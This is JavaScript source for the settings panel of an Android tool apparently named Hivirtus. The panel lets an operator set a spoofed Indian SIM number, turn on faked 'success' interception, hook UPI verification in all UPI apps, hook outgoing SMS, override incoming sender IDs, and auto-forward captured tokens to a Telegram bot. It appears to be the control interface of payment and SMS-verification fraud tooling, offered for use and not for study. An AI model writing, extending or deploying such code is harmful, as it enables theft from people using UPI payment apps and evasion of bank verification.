(function () {
  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];

  let cfg = {};
  let dirty = false;
  let loadedOnce = false;
  let saveTimer = null;
  let saving = false;

  function bridge() {
    return typeof Hivirtus !== "undefined" ? Hivirtus : null;
  }

  function parseCfg(raw) {
    try {
      return JSON.parse(raw || "{}");
    } catch (_) {
      return {};
    }
  }

  /** Last 10 Indian digits from +91 / 91 / raw */
  function digitsPhone(v) {
    let s = String(v || "").replace(/\D/g, "");
    if (s.startsWith("91") && s.length >= 12) s = s.slice(-10);
    else if (s.length > 10) s = s.slice(-10);
    return s;
  }

  function formatDisplay(digits) {
    const d = digitsPhone(digits);
    if (d.length < 10) return d;
    return d.slice(0, 5) + " " + d.slice(5);
  }

  function formatE164(digits) {
    const d = digitsPhone(digits);
    return d.length >= 10 ? "+91" + d : d;
  }

  function interceptOn() {
    const sw = $("#swIntercept");
    if (sw) return !!sw.checked;
    return cfg.intercept_fake_success === true || cfg.intercept_enabled === true;
  }

  function setHint(id, on, onText, offText) {
    const el = $("#" + id);
    if (!el) return;
    el.textContent = on ? onText : offText;
    el.classList.toggle("on", !!on);
    el.classList.toggle("off", !on);
  }

  function syncBodies() {
    [
      ["swFake", "bodyFake"],
      ["swPrefix", "bodyPrefix"],
      ["swSender", "bodySender"],
      ["swTg", "bodyTg"],
    ].forEach(([sw, body]) => {
      const s = $("#" + sw);
      const b = $("#" + body);
      if (!s || !b) return;
      if (sw === "swFake") {
        const has = digitsPhone(($("#phoneInput") || {}).value || "").length >= 10;
        b.classList.toggle("open", !!s.checked || has);
        return;
      }
      b.classList.toggle("open", !!s.checked);
    });
  }

  function paintLiveRail() {
    const phoneOn =
      ($("#swFake") && $("#swFake").checked) ||
      digitsPhone(($("#phoneInput") || {}).value || cfg.mock_phone_sim1 || "").length >= 10;
    const tgOn =
      ($("#swTg") && $("#swTg").checked) ||
      !!(cfg.telegram_bot_token && cfg.telegram_chat_id);
    const set = (id, on) => {
      const el = $("#" + id);
      if (!el) return;
      el.classList.toggle("on", !!on);
      el.classList.toggle("off", !on);
    };
    set("pillPhone", phoneOn);
    set("pillIntercept", interceptOn());
    set("pillTg", tgOn);
  }

  function paintStatusLabels() {
    const on = interceptOn();
    // Sirf Intercept on/off — Fake no / Sender id / baaki on text hatao
    setHint("interceptHint", on, "Intercept on", "off");

    const el = $("#statusLine");
    if (el) {
      el.textContent = on ? "Intercept on" : "off";
      el.classList.toggle("on", on);
      el.classList.toggle("off", !on);
    }
    paintLiveRail();
  }

  function paintSaveFlash(msg, ok) {
    const box = $("#saveStatus");
    if (!box) return;
    box.hidden = false;
    box.textContent = msg || "";
    box.classList.toggle("off", !ok);
    clearTimeout(paintSaveFlash._t);
    paintSaveFlash._t = setTimeout(() => {
      box.hidden = true;
      box.textContent = "";
    }, 1400);
  }

  function applyToForm() {
    $$("[data-key]").forEach((el) => {
      const k = el.dataset.key;
      let v = cfg[k];
      if (k === "enable_sim1_mock" && cfg.fake_number_enabled != null) {
        v = cfg.fake_number_enabled || v;
      }
      if (k === "intercept_fake_success" && cfg.intercept_enabled != null) {
        v = cfg.intercept_enabled || v;
      }
      if (k === "auto_forward_token" && cfg.telegram_enabled != null) {
        v = cfg.telegram_enabled || v;
      }
      if (k === "mock_phone_sim1") {
        const d = digitsPhone(v);
        el.value = d.length >= 10 ? formatDisplay(d) : d;
        return;
      }
      if (el.type === "checkbox") {
        el.checked = v === true || v === "true";
      } else {
        el.value = v == null ? "" : String(v);
      }
    });
    const d = digitsPhone(cfg.mock_phone_sim1);
    if (d.length >= 10 && $("#swFake")) $("#swFake").checked = true;
    syncBodies();
    paintStatusLabels();
  }

  function collect() {
    const out = { ...cfg };
    $$("[data-key]").forEach((el) => {
      const k = el.dataset.key;
      if (el.type === "checkbox") out[k] = el.checked;
      else if (k === "mock_phone_sim1") out[k] = formatE164(el.value);
      else out[k] = el.value.trim();
    });

    const digits = digitsPhone(out.mock_phone_sim1);
    out.fake_number_enabled = !!out.enable_sim1_mock || digits.length >= 10;
    out.enable_sim1_mock = out.fake_number_enabled;
    out.enable_phone_spoof = out.fake_number_enabled;
    out.enable_virtual_sim = digits.length >= 10;
    if (digits.length >= 10) out.mock_phone_sim1 = formatE164(digits);

    out.intercept_enabled = !!out.intercept_fake_success;
    out.telegram_enabled = !!out.auto_forward_token;
    out.fake_intercept_telegram = !!out.auto_forward_token;
    out.hook_outgoing_sms = out.hook_outgoing_sms !== false;
    out.hook_upi_verification = true;
    out.hook_all_upi_apps = true;
    out.auto_hook_foreground = true;
    out.sender_id_enabled = !!out.override_incoming_sender;

    if (out.inject_sender_id === "AD-TEST-S") out.inject_sender_id = "";
    if (out.inject_sender_id && String(out.inject_sender_id).trim().length > 0) {
      out.override_incoming_sender = true;
      out.sender_id_enabled = true;
    }

    if (out.telegram_bot_token && out.telegram_chat_id) {
      out.auto_forward_token = true;
      out.telegram_enabled = true;
      out.fake_intercept_telegram = true;
    }
    return out;
  }

  function save(quiet) {
    if (saving) return;
    saving = true;
    const next = collect();
    const b = bridge();
    try {
      if (b) b.saveConfig(JSON.stringify(next));
    } catch (_) {}
    cfg = next;
    dirty = false;
    const e164 = formatE164(next.mock_phone_sim1);
    const pin = $("#phoneInput");
    if (pin && digitsPhone(e164).length >= 10) {
      pin.value = formatDisplay(e164);
      if ($("#swFake")) $("#swFake").checked = true;
    }
    syncBodies();
    paintStatusLabels();
    if (!quiet) {
      const parts = [];
      if (interceptOn()) parts.push("Intercept on");
      if (digitsPhone(e164).length >= 10) parts.push(e164);
      paintSaveFlash(parts.join(" · ") || "Saved", true);
    }
    saving = false;
  }

  function scheduleSave(immediate) {
    dirty = true;
    cfg = collect();
    syncBodies();
    paintStatusLabels();
    clearTimeout(saveTimer);
    saveTimer = setTimeout(() => save(false), immediate ? 120 : 450);
  }

  $$(".tab").forEach((tab) => {
    tab.addEventListener("click", () => {
      $$(".tab").forEach((t) => t.classList.remove("active"));
      $$(".panel").forEach((p) => p.classList.remove("active"));
      tab.classList.add("active");
      const panel = document.getElementById("panel-" + tab.dataset.tab);
      if (panel) panel.classList.add("active");
    });
  });

  $("#btnMin")?.addEventListener("click", () => {
    location.href = "hivirtus://minimize";
  });

  const phoneInput = $("#phoneInput");
  if (phoneInput) {
    phoneInput.addEventListener("input", () => {
      let d = digitsPhone(phoneInput.value);
      if (d.length > 10) d = d.slice(-10);
      if (d.length === 10) {
        phoneInput.value = formatDisplay(d);
        if ($("#swFake")) $("#swFake").checked = true;
      }
      scheduleSave(d.length >= 10);
    });
    phoneInput.addEventListener("change", () => scheduleSave(true));
  }

  function load(force) {
    if (!force && dirty) return;
    if (
      !force &&
      loadedOnce &&
      document.activeElement &&
      document.activeElement.matches("input,textarea")
    ) {
      return;
    }
    const b = bridge();
    let raw = "{}";
    try {
      if (b && typeof b.readConfig === "function") raw = b.readConfig() || "{}";
    } catch (_) {}
    cfg = parseCfg(raw);
    if (cfg.intercept_fake_success == null && cfg.intercept_enabled == null) {
      cfg.intercept_fake_success = true;
    }
    if (cfg.hook_outgoing_sms == null) cfg.hook_outgoing_sms = true;
    applyToForm();
    loadedOnce = true;
    dirty = false;
  }

  $$("input").forEach((el) => {
    if (el.id === "phoneInput") return;
    el.addEventListener("change", () => scheduleSave(true));
    el.addEventListener("input", () => {
      if (el.type === "checkbox") return;
      scheduleSave(false);
    });
  });

  load(true);
  setTimeout(() => load(false), 250);
})();
